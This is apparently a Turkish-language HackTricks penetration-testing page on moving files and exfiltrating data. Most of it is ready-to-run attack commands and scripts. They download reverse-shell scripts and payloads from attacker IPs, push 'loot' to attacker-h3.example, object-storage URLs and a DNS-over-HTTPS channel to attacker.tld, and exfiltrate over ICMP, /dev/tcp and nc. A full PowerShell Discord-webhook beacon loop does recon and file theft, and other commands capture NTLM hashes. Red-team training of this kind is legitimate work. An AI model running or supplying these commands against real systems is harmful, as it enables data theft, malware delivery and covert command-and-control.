# Veri Sızdırma

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> `C:\Users\Public` konumunda loot staging işlemi yapıp meşru yedeklemeleri taklit etmek amacıyla Rclone ile exfiltration gerçekleştiren uçtan uca bir örnek için aşağıdaki workflow'u inceleyin.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Bilgi exfiltration işlemleri için yaygın olarak whitelist'e alınan domain'ler

Kötüye kullanılabilecek, yaygın olarak whitelist'e alınan domain'leri bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin.

## Copy\&Paste Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Dosya yükleme

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**GET ve POST isteklerini yazdıran SimpleHttpServer (header'lar da dahil)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Python modülü [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS Sunucusu**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
### HTTP/3 / QUIC

Çıkış kontrolleri klasik **TCP/443** incelemesi için yapılandırılmış, ancak **UDP/443** konusunda izin verici ise **HTTP/3** kullanmaya zorlamak, aktarımı TLS-over-TCP yerine **QUIC** üzerinden gerçekleştirebilir. Saldırgan uç noktasının yerel HTTP/3 desteğine sahip olması gerekir; örneğin zaten `Alt-Svc: h3` duyuran bir reverse proxy veya upload endpoint'i.
```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```
2025 tarihli bir araştırma makalesi (QUIC-Exfil), encrypted headers ve connection migration gibi QUIC özelliklerinin exfiltration tespitini firewall seviyesinde classic TLS veya DNS-based channels'a kıyasla zorlaştırabileceğini gösterdi; bu nedenle HTTP/3 desteği yaygınlaştıkça bu alanın daha relevant hale gelmesini bekleyin.

### Pre-signed / delegated object-storage uploads

Kısa ömürlü bir **signed URL** oluşturabildiğinizde veya edinebildiğinizde, victim'ın yalnızca normal bir HTTPS client'a ihtiyacı olur. Bu yöntem, host üzerine cloud SDK'ları veya uzun ömürlü credentials yükleme gereksinimini ortadan kaldırır ve yaygın object-storage trafiğine karışır.

**Linux / macOS (AWS S3 pre-signed `PUT`)**
```bash
curl -X PUT -T loot.7z \
-H 'Content-Type: application/octet-stream' \
'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```
**Windows PowerShell (AWS S3 pre-signed `PUT`)**
```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
-ContentType 'application/octet-stream' `
-Uri $presignedUrl
```
**Azure Blob SAS URL**
```bash
curl -X PUT --data-binary @loot.7z \
-H 'x-ms-blob-type: BlockBlob' \
-H 'Content-Type: application/octet-stream' \
'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```
Notlar:
- Pre-signed URL'ler / SAS token'ları genellikle **path**, **HTTP method** ve **expiration** kapsamlarını belirler.
- Azure Blob `Put Blob` için `x-ms-blob-type: BlockBlob` zorunludur.
- Bu pattern, `curl`, `Invoke-WebRequest` veya ham bir HTTPS `PUT` isteği gönderebilen özel bir implant ile iyi çalışır.

### goshs

[goshs](https://github.com/patrickhener/goshs), upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links
ve OOB collaboration özelliklerine (DNS, SMTP, NTLM hash capture) sahip,
`python3 -m http.server` için tek binary'li bir alternatiftir.
```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```
## Webhooks (Discord/Slack/Teams) ile C2 ve Data Exfiltration

Webhooks, JSON ve isteğe bağlı dosya parçalarını kabul eden salt-yazılır HTTPS uç noktalarıdır. Genellikle güvenilir SaaS domain'lerine izin verilir ve OAuth/API anahtarları gerektirmezler; bu da onları düşük sürtünmeli beaconing ve exfiltration için kullanışlı hale getirir.

Temel fikirler:
- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
- `payload_json` adlı bir parça içinde `{"content":"..."}` ve isteğe bağlı olarak `file` adlı dosya parçası/parçaları içeren `POST multipart/form-data`.
- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK teslimatı doğrular.

PowerShell PoC (Discord):
```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
param([string]$Text)
$payload = @{ content = $Text } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
param([string]$Path, [string]$Name)
if (-not (Test-Path $Path)) { return }
$bytes = [System.IO.File]::ReadAllBytes($Path)
$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
$mp = New-Object System.Net.Http.MultipartFormDataContent
$mp.Add($jsonContent, "payload_json")
$mp.Add($fileContent, "file", $Name)
$resp = $client.PostAsync($webhook, $mp).Result
Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
$ctr++
# Beacon
$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
Send-DiscordText -Text $beacon

# Every 2nd: quick folder listing
if ($ctr % 2 -eq 0) {
$dirs = @("Documents","Desktop","Downloads","Pictures")
$acc = foreach ($d in $dirs) {
$p = Join-Path $env:USERPROFILE $d
$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
}
Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
}

# Every 3rd: targeted exfil
if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

# Every 4th: basic recon
if ($ctr % 4 -eq 0) {
$who = whoami
$ip  = ipconfig | Out-String
$tmp = Join-Path $env:TEMP "recon.txt"
"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
Send-DiscordFile -Path $tmp -Name "recon.txt"
}

Start-Sleep -Seconds 20
}
```
Notlar:
- Benzer kalıplar, incoming webhook'larını kullanan diğer collaboration platformları (Slack/Teams) için de geçerlidir; URL'yi ve JSON şemasını uygun şekilde değiştirin.
- Discord Desktop cache artifact'ları ve webhook/API recovery için bkz.:

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (cloud/object-storage exfiltration)

Modern operatörler genellikle **loot'u yerel olarak stage eder** ve ardından transferin normal bir backup veya sync job'ı gibi görünmesini sağlamak için [Rclone](https://rclone.org/) kullanır. Pratik bir kalıp şöyledir:

1. Normal bir remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. **İçeriklerin ve dosya adlarının client-side olarak encrypt edilmesi** için bir `crypt` wrapper
3. Provider object-size limit'leri uyguluyorsa veya daha küçük upload unit'leri istiyorsanız isteğe bağlı bir `chunker` wrapper
```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
--transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```
Notlar:
- `crypt` hem dosya içeriklerini hem de adlarını şifreleyebilir.
- `chunker` büyük dosyaları şeffaf bir şekilde parçalara böler ve indirme sırasında yeniden birleştirir.
- `rclone.conf`, `crypt` secrets değerlerini güçlü bir beklemedeki veri koruması sağlamayan **gizlenmiş** bir biçimde depolar. Kısa süreli işlemler için özel bir geçici config kullanmayı ve işlemden sonra bunu silmeyi tercih edin. Daha uzun süre saklamanız gerekiyorsa, diskte çıplak bir `rclone.conf` bırakmak yerine şifrelenmiş config yönetimini (`RCLONE_CONFIG_PASS` / `--password-command`) tercih edin.
- Hedef sistem zaten **OneDrive**, **Google Drive** veya **Dropbox** ile sync yapıyorsa, loot'u synchronized directory içine kopyalamak yeni bir transfer binary'si bırakmak yerine zaten onaylanmış bir client'tan yararlanmanızı sağlayabilir.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP sunucusu (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP sunucusu (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP sunucusu (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** istemcisi
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Sunucu olarak Kali
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Veya **samba kullanarak** bir smb paylaşımı oluşturun:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
### goshs
[goshs](https://github.com/patrickhener/goshs), dosyaları SMB üzerinden sunan ve bağlanan istemcilerden NetNTLMv2 hash'lerini yakalayan tek binary'li bir alternatiftir:
```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```
## SCP

Saldırganın SSHd'yi çalıştırıyor olması gerekir.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Victim'da SSH varsa, attacker victim'daki bir directory'yi attacker'ın üzerine mount edebilir.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Kurban makineden dosya indirme
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Kurbanın sistemine dosya yükleme
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
**@BinaryShadow\_** sayesinde

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## DNS over HTTPS (DoH)

Klasik UDP/53 DNS gürültülü veya engellenmişse ancak dışa giden HTTPS trafiğine genel olarak izin veriliyorsa, alışılmış DNS-label exfiltration pattern'i public resolver'a gönderilen **DoH** isteklerinin içine sarılabilir. Her label'ı 63-byte DNS limitinin oldukça altında tutun ve Base32 gibi DNS-safe bir alphabet kullanın.
```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
nl -nrz -w4 -s. | while read chunk; do
curl --http2 -s \
-H 'accept: application/dns-json' \
"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
>/dev/null
done
```
`exf.attacker.tld` için authoritative DNS server üzerinde sorguları numeric prefix'e göre sıralayın ve Base32 stream'ini yeniden oluşturun. Bu yöntem, transport'ı klasik UDP/53 DNS yerine resolver'a giden HTTPS içinde tutar.

Tam çift yönlü DNS tunnel tooling (`iodine`, `dnscat2`, vb.) için [tunneling page](tunneling-and-port-forwarding.md) sayfasına bakın.

## **SMTP**

Bir SMTP server'a data gönderebiliyorsanız, data'yı almak için Python ile bir SMTP oluşturabilirsiniz:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
### goshs

[goshs](https://github.com/patrickhener/goshs), OOB exfiltration senaryoları sırasında e-posta callback'lerini yakalamak için hızlı bir SMTP server'ı çalıştırabilir:
```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```
Alınan e-postalar ve callback'ler doğrudan terminal çıktısında görüntülenir.
Tam OOB kapsamı için DNS callback server ile birleştirilebilir:
```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```
## TFTP

XP ve 2003'te varsayılan olarak (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)

Kali'de **TFTP server'ı başlatın**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python ile TFTP server:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**victim** içinde Kali sunucusuna bağlanın:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHP tek satırlık koduyla bir dosya indirin:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Mağdur**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe` programı yalnızca binary dosyaların incelenmesine değil, aynı zamanda **hex değerlerinden yeniden oluşturulmasına da** olanak tanır. Bu, bir binary dosyanın hex değerleri sağlandığında `debug.exe` aracılığıyla binary dosyanın oluşturulabileceği anlamına gelir. Ancak debug.exe'nin **dosyaları 64 kb'a kadar assemble etme sınırlaması** olduğunu unutmamak önemlidir.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Ardından metni windows-shell içine kopyalayıp yapıştırın; nc.exe adlı bir dosya oluşturulacaktır.

## Referanslar

- [Windows'a dosya aktarma](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [Rclone `crypt` backend'i](https://rclone.org/crypt/)
- [goshs](https://github.com/patrickhener/goshs)
- [C2 olarak Discord ve geride bırakılan önbelleğe alınmış kanıtlar](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [Discord Webhooks - Webhook'u yürütme](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
- [Presigned URL'ler ile object yükleme - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [QUIC-Exfil: Veri Exfiltration saldırıları gerçekleştirmek için QUIC'in Server Preferred Address özelliğinden yararlanma](https://arxiv.org/abs/2505.05292)

{{#include ../banners/hacktricks-training.md}}
